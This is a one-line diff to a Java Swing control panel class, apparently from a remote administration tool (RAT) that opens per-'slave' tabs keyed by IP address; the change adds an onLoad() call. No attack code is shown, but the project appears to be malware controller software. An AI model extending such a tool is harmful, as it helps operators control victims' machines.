@@ -411,6 +411,7 @@ public class FrameControlPanel extends BaseFrame {
 			for (RATControlMenuEntry entry : entries) {
 				try {
 					BaseControlPanel panel = entry.newPanelInstance(RATObjectFormat.format(slave));
+					panel.onLoad();
 					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? def : entry.getIcon(), panel);
 					entry.instances.put(slave.getIP(), panel);
 				} catch (Exception ex) {
